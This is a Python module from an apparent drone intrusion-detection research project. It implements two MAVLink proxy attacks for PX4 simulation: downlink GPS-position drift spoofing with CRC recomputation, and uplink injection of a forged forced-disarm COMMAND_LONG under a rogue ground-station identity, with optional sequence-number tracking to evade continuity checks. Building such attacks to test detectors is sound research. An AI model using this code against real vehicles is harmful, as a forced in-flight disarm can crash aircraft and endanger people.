"""Live P2 proxy attacks -- ``docs/ATTACK_PROXY.md``.

Two ``FrameHook``-conforming (``Callable[[FrameContext], list[bytes]]``), pure,
stateful-but-socket-free callables; no sockets, no threads, no PX4/Gazebo ground
truth. Neither subclasses or imports ``attacks/base.py``, which is a frozen
Stage-1 contract (``.claude/rules/frozen-contracts.md``) this module never
touches -- each reuses Stage-1 attack *parameters and mode semantics* honestly
translated to the live-link operating mode, not the ``Attack``/``AttackContext``
interface itself.

1. :class:`PositionDriftAttack` (§3) -- downlink ``GLOBAL_POSITION_INT``
   modification. Reuses ``gps_spoofing.gradual_drift``'s parameters (decode ->
   shift lat/lon -> leave velocity truthful -> re-encode, recomputing the
   MAVLink2 CRC). **Injection point**: downlink telemetry, PX4 -> IDS/GCS.
   **Claim class**: link-level detection only (SITL) -- PX4's own
   estimator/trajectory is mechanically unaffected; this proxy only ever
   writes toward the IDS/GCS side of the link. This is *not* GPS spoofing of
   the vehicle.
2. :class:`CommandInjectionAttack` -- uplink ``COMMAND_LONG`` injection under a
   rogue GCS identity, analogous in intent to (but a distinct implementation
   from) Stage-1's ``command_injection.rogue_command``. **Injection point**:
   uplink, attacker -> PX4. **Claim class**: command-path effect (SITL) *only
   if* a matching ``COMMAND_ACK`` is observed on the downlink -- otherwise only
   a wire-level fact ("a forged frame reached PX4"), and never an IDS-detection
   or vehicle-trajectory claim. See its own docstring for the full design.
"""

from __future__ import annotations

import math
from collections.abc import Callable, Mapping
from dataclasses import dataclass
from datetime import UTC, datetime
from typing import Literal

import numpy as np
from pymavlink.dialects.v20 import common as mav2

from ..core.geo import offset_latlon
from .groundtruth import FrameLogEntry, FrameLogWriter
from .hooks import FrameContext

GLOBAL_POSITION_INT_ID = 33
HEARTBEAT_ID = 0
COMMAND_LONG_ID = 76
COMMAND_ACK_ID = 77
_V2_MAGIC = 0xFD
_MAV_AUTOPILOT_PX4 = mav2.MAV_AUTOPILOT_PX4

#: Randomization ranges -- docs/ATTACK_PROXY.md §3 "Randomization plan" table.
#: Disclosed up front (mechanism transparency, per §6); only the per-trial
#: *draws* for holdout seeds are withheld (``groundtruth.is_holdout``).
RANGES: Mapping[str, tuple[float, float]] = {
    "onset_s": (20.0, 60.0),
    "duration_s": (15.0, 40.0),
    "drift_rate_ms": (2.0, 10.0),
    "bearing_deg": (0.0, 360.0),
}

#: docs/ATTACK_PROXY.md §3 "Timing": 10 s pass-through before any modification,
#: regardless of ``onset_s`` (which is itself always drawn >= 20 s, so this is
#: a defensive floor, not the usual binding constraint).
DEFAULT_WARMUP_S = 10.0


@dataclass(frozen=True)
class PositionDriftParams:
    """One trial's drawn parameters -- docs/ATTACK_PROXY.md §3 table."""

    trial_seed: int
    trial_index: int
    onset_s: float
    duration_s: float
    drift_rate_ms: float
    bearing_deg: float


def draw_params(
    seed: int,
    trial_index: int = 0,
    ranges: Mapping[str, tuple[float, float]] = RANGES,
) -> PositionDriftParams:
    """Draw one trial's parameters deterministically.

    ``docs/ATTACK_PROXY.md`` §3: ``trial_seed = seed + trial_index`` feeds a
    fresh ``numpy.random.default_rng``; draws happen in the table's order
    (onset, duration, drift_rate, bearing) so two calls with the same
    ``(seed, trial_index, ranges)`` are byte-identical, and different seeds (or
    trial indices) draw independently.
    """
    trial_seed = seed + trial_index
    rng = np.random.default_rng(trial_seed)
    onset_s = float(rng.uniform(*ranges["onset_s"]))
    duration_s = float(rng.uniform(*ranges["duration_s"]))
    drift_rate_ms = float(rng.uniform(*ranges["drift_rate_ms"]))
    bearing_deg = float(rng.uniform(*ranges["bearing_deg"]))
    return PositionDriftParams(
        trial_seed=trial_seed,
        trial_index=trial_index,
        onset_s=onset_s,
        duration_s=duration_s,
        drift_rate_ms=drift_rate_ms,
        bearing_deg=bearing_deg,
    )


class PositionDriftAttack:
    """``FrameHook`` for the first live attack -- ``docs/ATTACK_PROXY.md`` §3.

    Modifies only ``GLOBAL_POSITION_INT`` (msgid 33) downlink frames from the
    target vehicle, only inside ``[onset_s, onset_s + duration_s)`` measured
    from the first vehicle frame this hook observes (monotonic ``recv_ns``)
    after a pass-through warmup, by rewriting ``lat``/``lon`` with a
    closed-form gradual-drift displacement and recomputing the MAVLink2 CRC.
    ``vx``/``vy``/``vz``/``alt``/``relative_alt``/``time_boot_ms``/``hdg`` are
    left untouched. Every other frame is passed through byte-identical.

    Never raises: any decode problem on a frame counts and passes the original
    bytes through unchanged. Deterministic given ``(params, frame sequence)``.

    ``target_sysid``/``target_compid``: if both ``None`` (default), learned
    passively from the first HEARTBEAT whose ``autopilot`` field is
    ``MAV_AUTOPILOT_PX4`` (12). Until learned, every frame passes through
    untouched -- fail closed rather than guess which traffic is the vehicle's.
    Signed frames are never modified (cannot re-sign without the key): they
    pass through and are counted in ``frames_skipped_signed``.
    """

    def __init__(
        self,
        params: PositionDriftParams,
        *,
        target_sysid: int | None = None,
        target_compid: int | None = None,
        warmup_s: float = DEFAULT_WARMUP_S,
        frame_log: FrameLogWriter | None = None,
        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
    ) -> None:
        if (target_sysid is None) != (target_compid is None):
            raise ValueError("target_sysid and target_compid must both be set or both be None")
        self.params = params
        self._target_sysid = target_sysid
        self._target_compid = target_compid
        self._warmup_s = warmup_s
        self._frame_log = frame_log
        self._now_utc = now_utc
        self._decoder = mav2.MAVLink(None)
        self._first_vehicle_recv_ns: int | None = None

        self.frames_seen = 0
        self.frames_modified = 0
        self.frames_dropped = 0
        self.frames_injected = 0
        self.frames_skipped_signed = 0

    # -- the hook ------------------------------------------------------------ #

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        if ctx.direction != "down":
            return [ctx.raw]

        self._maybe_learn_target(ctx)
        if self._target_sysid is None:
            return [ctx.raw]

        is_target = ctx.sysid == self._target_sysid and ctx.compid == self._target_compid
        if is_target and self._first_vehicle_recv_ns is None:
            self._first_vehicle_recv_ns = ctx.recv_ns

        if not is_target or ctx.msgid != GLOBAL_POSITION_INT_ID:
            return [ctx.raw]

        elapsed_s = (ctx.recv_ns - self._first_vehicle_recv_ns) / 1e9
        onset, duration = self.params.onset_s, self.params.duration_s
        if not (elapsed_s >= max(self._warmup_s, onset) and elapsed_s < onset + duration):
            return [ctx.raw]

        if ctx.signed:
            self.frames_skipped_signed += 1
            self._log(ctx, action="forwarded", field_deltas={}, crc_recomputed=False,
                       modified_len=len(ctx.raw))
            return [ctx.raw]
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return [ctx.raw]  # MAVLink 1 (or malformed): pass through, not our target wire format

        try:
            new_raw, deltas = self._modify(ctx, elapsed_s - onset)
        except Exception:
            return [ctx.raw]  # never raise: any decode/pack problem passes the original through

        self.frames_modified += 1
        self._log(ctx, action="modified", field_deltas=deltas, crc_recomputed=True,
                   modified_len=len(new_raw))
        return [new_raw]

    # -- internals ------------------------------------------------------------ #

    def _maybe_learn_target(self, ctx: FrameContext) -> None:
        if self._target_sysid is not None:
            return
        if ctx.direction != "down" or ctx.msgid != HEARTBEAT_ID or ctx.signed:
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() != "HEARTBEAT":
            return
        if getattr(msg, "autopilot", None) == _MAV_AUTOPILOT_PX4:
            self._target_sysid = ctx.sysid
            self._target_compid = ctx.compid

    def _modify(self, ctx: FrameContext, elapsed_since_onset: float) -> tuple[bytes, dict[str, int]]:
        msg = self._decoder.decode(bytearray(ctx.raw))
        if msg.get_type() != "GLOBAL_POSITION_INT":
            raise ValueError(f"unexpected decoded type {msg.get_type()!r} for msgid 33")

        lat0, lon0 = msg.lat, msg.lon
        disp_m = self.params.drift_rate_ms * max(0.0, elapsed_since_onset)
        bearing_rad = math.radians(self.params.bearing_deg)
        north_m = disp_m * math.cos(bearing_rad)
        east_m = disp_m * math.sin(bearing_rad)
        lat_new_deg, lon_new_deg = offset_latlon(lat0 / 1e7, lon0 / 1e7, north_m, east_m)
        lat_new = int(round(lat_new_deg * 1e7))
        lon_new = int(round(lon_new_deg * 1e7))

        msg.lat = lat_new
        msg.lon = lon_new
        encoder = mav2.MAVLink(None, srcSystem=ctx.sysid, srcComponent=ctx.compid)
        encoder.seq = ctx.seq
        new_raw = bytes(msg.pack(encoder))

        return new_raw, {"lat_1e7deg": lat_new - lat0, "lon_1e7deg": lon_new - lon0}

    def _log(
        self,
        ctx: FrameContext,
        *,
        action: str,
        field_deltas: dict[str, int],
        crc_recomputed: bool,
        modified_len: int,
    ) -> None:
        if self._frame_log is None:
            return
        entry = FrameLogEntry(
            seq_no=self.frames_seen,
            proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
            recv_ns=ctx.recv_ns,
            msgid=ctx.msgid,
            sysid=ctx.sysid,
            compid=ctx.compid,
            mavlink_seq=ctx.seq,
            action=action,
            field_deltas=field_deltas,
            crc_recomputed=crc_recomputed,
            original_len=len(ctx.raw),
            modified_len=modified_len,
        )
        self._frame_log.append(entry)


# --------------------------------------------------------------------------- #
# Second live attack: uplink COMMAND_LONG injection (rogue GCS identity)
# --------------------------------------------------------------------------- #

#: Stage-1 ``command_injection`` default rogue identity (``configs/attacks.yaml``
#: ``command_injection.source_sysid``/``source_compid``), reused here for continuity --
#: distinct from both the legitimate GCS (255/190) and the IDS tap (254/191) used in
#: ``scripts/sitl/run_p2_trial.py``-style trial scripts.
DEFAULT_ROGUE_SYSID = 66
DEFAULT_ROGUE_COMPID = 200

#: ``MAV_CMD_COMPONENT_ARM_DISARM`` -- see ``CommandInjectionAttack`` docstring for why this
#: command (over e.g. ``MAV_CMD_DO_SET_MODE``) was chosen for the first live injection attack.
DEFAULT_COMMAND = mav2.MAV_CMD_COMPONENT_ARM_DISARM  # 400

#: param1=0.0 (disarm, not arm) ; param2=21196.0 (the documented PX4/MAVLink "force" magic
#: value -- bypasses the "vehicle must be landed" safety check, maximising the chance PX4
#: actually acts on an in-flight disarm rather than rejecting it outright with
#: MAV_RESULT_TEMPORARILY_REJECTED for reasons unrelated to provenance); param3-7 unused (0.0).
DEFAULT_COMMAND_PARAMS: tuple[float, float, float, float, float, float, float] = (
    0.0, 21196.0, 0.0, 0.0, 0.0, 0.0, 0.0,
)

#: Randomization ranges for the injection attack -- disclosed up front (mechanism
#: transparency, docs/ATTACK_PROXY.md §6), same holdout convention as ``RANGES`` above.
#: ``burst_count`` brackets the Stage-1 ``command_injection.burst`` default of 6 (rounded to
#: the nearest int after drawing uniformly); ``inter_injection_gap_s`` keeps repeated
#: injections from landing on the same real uplink frame (the piggyback carrier) and spreads
#: them across several of the client's periodic uplink frames (nominally its 1 Hz heartbeat).
COMMAND_INJECTION_RANGES: Mapping[str, tuple[float, float]] = {
    "onset_s": (20.0, 60.0),
    "burst_count": (1.0, 6.0),
    "inter_injection_gap_s": (0.8, 2.0),
}


@dataclass(frozen=True)
class CommandInjectionParams:
    """One trial's drawn parameters for :class:`CommandInjectionAttack`."""

    trial_seed: int
    trial_index: int
    onset_s: float
    burst_count: int
    inter_injection_gap_s: float


def draw_command_injection_params(
    seed: int,
    trial_index: int = 0,
    ranges: Mapping[str, tuple[float, float]] = COMMAND_INJECTION_RANGES,
) -> CommandInjectionParams:
    """Draw one trial's command-injection parameters deterministically.

    Same convention as :func:`draw_params` (position-drift attack): ``trial_seed = seed +
    trial_index`` feeds a fresh ``numpy.random.default_rng``; draws happen in a fixed order
    (onset, burst_count, inter_injection_gap) so two calls with the same
    ``(seed, trial_index, ranges)`` are byte-identical.
    """
    trial_seed = seed + trial_index
    rng = np.random.default_rng(trial_seed)
    onset_s = float(rng.uniform(*ranges["onset_s"]))
    burst_count = max(1, int(round(float(rng.uniform(*ranges["burst_count"])))))
    inter_injection_gap_s = float(rng.uniform(*ranges["inter_injection_gap_s"]))
    return CommandInjectionParams(
        trial_seed=trial_seed,
        trial_index=trial_index,
        onset_s=onset_s,
        burst_count=burst_count,
        inter_injection_gap_s=inter_injection_gap_s,
    )


class CommandInjectionAttack:
    """``FrameHook`` for the second live attack -- uplink ``COMMAND_LONG`` injection
    impersonating a rogue GCS identity, targeting the passively-learned PX4 sysid/compid.

    **Chosen command**: ``MAV_CMD_COMPONENT_ARM_DISARM`` (disarm, with the ``force`` magic
    param2=21196 so PX4 does not simply refuse an in-flight disarm as "not landed"), over
    ``MAV_CMD_DO_SET_MODE``. Justification: (1) ground truth is unambiguous and binary --
    armed/disarmed is a single bit in ``HEARTBEAT.base_mode`` and is exactly what
    ``COMMAND_ACK.result`` answers, whereas ``DO_SET_MODE``'s ``custom_mode`` is an
    ArduPilot/PX4-specific integer that needs a second decode step to say what mode was
    actually requested/entered; (2) it is the highest-consequence single command available
    (an accepted in-flight disarm is an immediate, unambiguous command-path effect -- a
    falling vehicle -- unlike a mode change, whose effect is behavioural and slower to
    verify); (3) it is the Stage-1 ``command_injection`` config's own default command
    (``configs/attacks.yaml``), preserving red/blue continuity with the documented
    simulator attack of the same name.

    **Injection point**: uplink, attacker (this hook) -> PX4. The relay calls one ``FrameHook``
    per real frame (``proxy/hooks.py``); there is no timer-driven call with no associated real
    frame, so a new frame cannot be emitted "out of nowhere" -- this hook instead **piggybacks**:
    on a real uplink frame arriving at/after the scheduled ``onset_s`` (nominally the client's
    1 Hz heartbeat, but functionally *any* real uplink frame works -- this hook never decodes
    the carrier, so its MAVLink version/type is irrelevant), it returns
    ``[ctx.raw, injected_raw]`` -- the real frame **unchanged**, plus one proxy-authored
    ``COMMAND_LONG``. It never drops or modifies a real uplink frame.

    **Claim class**: by itself, ``frames_injected > 0`` shows only that a syntactically valid
    forged ``COMMAND_LONG`` reached the wire toward PX4 (a wire-level fact) -- *not* that PX4
    accepted or acted on it, and *not* anything about IDS detection (link-level claims about
    an uplink attack are a different, and here undemonstrated, question from whether the IDS
    would flag it). Command-path effect (SITL) is only claimed once a matching
    ``COMMAND_ACK`` is *observed* on the downlink (see ``_maybe_observe_ack`` below) --
    ground truth, not detector output, and not sufficient on its own to claim trajectory
    deviation (that would need telemetry-level verification, not implemented here).

    **Ack verification mechanism**: the *same* ``CommandInjectionAttack`` instance must be
    installed as **both** the relay's ``up_hook`` (to inject) **and** ``down_hook`` (to watch
    for the ack) -- ``direction == "up"`` runs the injection logic, ``direction == "down"``
    only ever watches (and passes through unchanged; this attack never modifies downlink
    traffic, unlike ``PositionDriftAttack``). **Known limitation**: MAVLink 2's
    ``COMMAND_LONG``/``COMMAND_ACK`` pair has no request-id, so an ack is matched to this
    attack's injected frame(s) by ``command`` id alone (``docs/ATTACKS.md`` records this as a
    protocol-level limitation, not a bug in this attack) -- if two different commands were
    ever in flight on the same link at once, an ack naming one of them cannot be distinguished
    here from an ack answering the other if they happened to share a command id (they would
    not, by definition, but an ack that is actually answering a *legitimate* GCS command that
    happens to share this attack's command id would be misattributed as answering the
    injected one). Only unsigned MAVLink 2 ``COMMAND_ACK`` frames are recognised (same
    target-wire-format convention as ``PositionDriftAttack._modify``).

    ``target_sysid``/``target_compid``: same passive-learning convention as
    ``PositionDriftAttack`` -- if both ``None`` (default), learned from the first unsigned
    MAVLink2 ``HEARTBEAT`` whose ``autopilot`` field is ``MAV_AUTOPILOT_PX4`` (12); until
    learned, every uplink frame passes through untouched and nothing is injected (fail
    closed). A carrier frame that is itself signed is never used to piggyback (fail closed,
    same conservatism as ``PositionDriftAttack``'s refusal to modify signed frames) and is
    counted in ``frames_skipped_signed`` -- no signing exists on this link today (``signed=0``
    for 100% of P1 captures), so this is not expected to trigger in current SITL trials.

    Never raises. Deterministic given ``(params, frame sequence)``: with the default
    ``seq_policy="own_counter"`` the rogue source's own MAVLink sequence counter starts at 0
    and increments once per injected frame, independent of any real frame's sequence number.

    ``seq_policy="track_identity"`` (opt-in; used when ``rogue_sysid``/``rogue_compid`` impersonate
    an identity that is *really transmitting* on the link, e.g. the expected GCS 255/190): the
    attack passively reads that identity's own uplink frames (clear text on an unsigned link) and
    stamps each forged frame with the next sequence number that identity is expected to send, so
    the forgery continues the real counter instead of starting a second, inconsistent one. Until
    one frame from that identity has been seen it injects nothing (fail closed;
    ``frames_skipped_no_identity_seq``). This models an attacker who can read the link; it is a
    strictly stronger attacker than the default, and what a per-source sequence-continuity check
    cannot see.
    """

    def __init__(
        self,
        params: CommandInjectionParams,
        *,
        target_sysid: int | None = None,
        target_compid: int | None = None,
        rogue_sysid: int = DEFAULT_ROGUE_SYSID,
        rogue_compid: int = DEFAULT_ROGUE_COMPID,
        command: int = DEFAULT_COMMAND,
        command_params: tuple[float, float, float, float, float, float, float] = (
            DEFAULT_COMMAND_PARAMS
        ),
        warmup_s: float = DEFAULT_WARMUP_S,
        frame_log: FrameLogWriter | None = None,
        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
        seq_policy: Literal["own_counter", "track_identity"] = "own_counter",
    ) -> None:
        if (target_sysid is None) != (target_compid is None):
            raise ValueError("target_sysid and target_compid must both be set or both be None")
        if len(command_params) != 7:
            raise ValueError("command_params must have exactly 7 entries (MAVLink COMMAND_LONG)")
        if seq_policy not in ("own_counter", "track_identity"):
            raise ValueError("seq_policy must be 'own_counter' or 'track_identity'")
        self.params = params
        self._target_sysid = target_sysid
        self._target_compid = target_compid
        self._rogue_sysid = rogue_sysid
        self._rogue_compid = rogue_compid
        self._command = command
        self._command_params = command_params
        self._warmup_s = warmup_s
        self._frame_log = frame_log
        self._now_utc = now_utc
        self._decoder = mav2.MAVLink(None)
        self._first_client_recv_ns: int | None = None
        self._rogue_seq = 0
        self._seq_policy = seq_policy
        # track_identity only: the seq the impersonated identity's NEXT real frame is expected to carry,
        # learned passively from that identity's own uplink frames (None until one has been seen).
        self._identity_next_seq: int | None = None
        self._injected_count = 0
        self._last_injection_recv_ns: int | None = None

        self.frames_skipped_no_identity_seq = 0
        self.frames_seen = 0
        # This attack never modifies or drops a real frame -- kept at 0 for API parity with
        # PositionDriftAttack so run_p2_trial.py-style scripts work unchanged either way.
        self.frames_modified = 0
        self.frames_dropped = 0
        self.frames_injected = 0
        self.frames_skipped_signed = 0

    # -- the hook ------------------------------------------------------------ #

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        if ctx.direction == "down":
            self._maybe_learn_target(ctx)
            self._maybe_observe_ack(ctx)
            return [ctx.raw]  # this attack never touches downlink traffic

        # uplink: the real frame is always forwarded unchanged; we only ever append.
        if self._first_client_recv_ns is None:
            self._first_client_recv_ns = ctx.recv_ns
        if (self._seq_policy == "track_identity" and not ctx.signed
                and ctx.sysid == self._rogue_sysid and ctx.compid == self._rogue_compid):
            # passive read of the impersonated identity's running counter (clear text on an unsigned link)
            self._identity_next_seq = (ctx.seq + 1) % 256
        if self._target_sysid is None:
            return [ctx.raw]  # fail closed: no learned target yet

        elapsed_s = (ctx.recv_ns - self._first_client_recv_ns) / 1e9
        if not self._should_inject(ctx.recv_ns, elapsed_s):
            return [ctx.raw]

        if ctx.signed:
            self.frames_skipped_signed += 1
            return [ctx.raw]

        if self._seq_policy == "track_identity" and self._identity_next_seq is None:
            self.frames_skipped_no_identity_seq += 1  # fail closed: nothing observed to continue yet
            return [ctx.raw]

        try:
            injected_raw, rogue_seq_used = self._build_command_long()
        except Exception:
            return [ctx.raw]  # never raise: a pack problem just means no injection this call

        self._injected_count += 1
        self._last_injection_recv_ns = ctx.recv_ns
        self.frames_injected += 1
        self._log(
            action="injected",
            recv_ns=ctx.recv_ns,
            msgid=COMMAND_LONG_ID,
            sysid=self._rogue_sysid,
            compid=self._rogue_compid,
            mavlink_seq=rogue_seq_used,
            field_deltas={
                "command": int(self._command),
                "target_system": self._target_sysid,
                "target_component": self._target_compid,
            },
            crc_recomputed=True,
            original_len=0,
            modified_len=len(injected_raw),
        )
        return [ctx.raw, injected_raw]

    # -- internals ------------------------------------------------------------ #

    def _should_inject(self, recv_ns: int, elapsed_s: float) -> bool:
        if self._injected_count >= self.params.burst_count:
            return False
        if elapsed_s < max(self._warmup_s, self.params.onset_s):
            return False
        if self._last_injection_recv_ns is not None:
            gap_s = (recv_ns - self._last_injection_recv_ns) / 1e9
            if gap_s < self.params.inter_injection_gap_s:
                return False
        return True

    def _maybe_learn_target(self, ctx: FrameContext) -> None:
        if self._target_sysid is not None:
            return
        if ctx.direction != "down" or ctx.msgid != HEARTBEAT_ID or ctx.signed:
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() != "HEARTBEAT":
            return
        if getattr(msg, "autopilot", None) == _MAV_AUTOPILOT_PX4:
            self._target_sysid = ctx.sysid
            self._target_compid = ctx.compid

    def _maybe_observe_ack(self, ctx: FrameContext) -> None:
        if self._injected_count == 0:
            return  # nothing injected yet to match against
        if ctx.msgid != COMMAND_ACK_ID or ctx.signed:
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return  # MAVLink 1 (or malformed): not our recognised ack wire format
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() != "COMMAND_ACK":
            return
        if int(msg.command) != int(self._command):
            return  # known limitation (see class docstring): matched by command id only
        self._log(
            action="observed_ack",
            recv_ns=ctx.recv_ns,
            msgid=ctx.msgid,
            sysid=ctx.sysid,
            compid=ctx.compid,
            mavlink_seq=ctx.seq,
            field_deltas={"result": int(msg.result), "command": int(msg.command)},
            crc_recomputed=False,
            original_len=len(ctx.raw),
            modified_len=len(ctx.raw),
        )

    def _build_command_long(self) -> tuple[bytes, int]:
        msg = mav2.MAVLink_command_long_message(
            self._target_sysid, self._target_compid, self._command, 0, *self._command_params
        )
        encoder = mav2.MAVLink(None, srcSystem=self._rogue_sysid, srcComponent=self._rogue_compid)
        if self._seq_policy == "track_identity":
            assert self._identity_next_seq is not None  # guarded in __call__
            seq_used = self._identity_next_seq
            self._identity_next_seq = (seq_used + 1) % 256
        else:
            seq_used = self._rogue_seq
            self._rogue_seq = (self._rogue_seq + 1) % 256
        encoder.seq = seq_used
        raw = bytes(msg.pack(encoder))
        return raw, seq_used

    def _log(
        self,
        *,
        action: str,
        recv_ns: int,
        msgid: int,
        sysid: int,
        compid: int,
        mavlink_seq: int,
        field_deltas: dict[str, int],
        crc_recomputed: bool,
        original_len: int,
        modified_len: int,
    ) -> None:
        if self._frame_log is None:
            return
        entry = FrameLogEntry(
            seq_no=self.frames_seen,
            proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
            recv_ns=recv_ns,
            msgid=msgid,
            sysid=sysid,
            compid=compid,
            mavlink_seq=mavlink_seq,
            action=action,
            field_deltas=field_deltas,
            crc_recomputed=crc_recomputed,
            original_len=original_len,
            modified_len=modified_len,
        )
        self._frame_log.append(entry)
